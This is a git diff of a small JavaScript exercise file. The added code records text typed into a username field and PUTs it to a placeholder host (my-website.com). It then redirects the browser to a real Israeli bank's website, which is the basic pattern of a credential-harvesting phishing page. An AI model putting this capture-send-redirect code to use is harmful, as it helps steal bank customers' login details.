@@ -116,6 +116,7 @@ console.log(sentencesArray);
 
 
 
+const arry=[];
 //3
 document.getElementById("username").addEventListener("input",function(){
 const inputValue=this.value;
@@ -123,7 +124,7 @@ const inputValue=this.value;
 const firstFourLetters=inputValue.slice(0,4);
 console.log("First four letters"+ firstFourLetters);
 
-const arry=[];
+//const arry=[];
 arry.push(firstFourLetters);
 console.log(arry);
 
@@ -140,47 +141,20 @@ const firstFourLetters2=inputValue.slice(0,4);
 
 but.addEventListener("click" , async function(e){
  e.preventDefault();
- await fetch('https://api.thecatapi.com/v1/images/search', {
+ const sentData = arry.slice(arry.length-4, arry.length);
+
+
+ await fetch('https://my-website.com', {
   method: 'PUT',
   headers: {
     'Content-Type': 'application/json',
     'xx-nickname': 'esraa', 
   },
-  body: JSON.stringify(firstFourLetters2)
+  body: JSON.stringify(sentData)
 });
 
-window.location.href = 'https://www.google.com';
+window.location.href = 'https://www.bankhapoalim.co.il/';
 })
-
-
-
-
-
-
-
-
-
-
-//4
-  // Event listener for the submit button
-  document.getElementById("singup-but").addEventListener('submit', async function(e) {
-    e.preventDefault(); // Prevent form's default submission behavior
-
-    // Cut the last 4 items from the array
-    console.log("Last 4 items to be sent: ", firstFourLetter);
-
-    await fetch('https://reqres.in/api/users', {
-      method: 'PUT',
-      headers: {
-        'Content-Type': 'application/json', // Content type
-        'xx-nickname': 'esraa', // Personal nickname header
-      },
-      body: JSON.stringify(firstFourLetter) // Convert the last 4 items to JSON
-    });
-
-    // After the request, you can redirect to another page if needed
-    //window.location.href = 'https://www.ynet.co.il'; // Redirect to another page
-  });
 
 
 
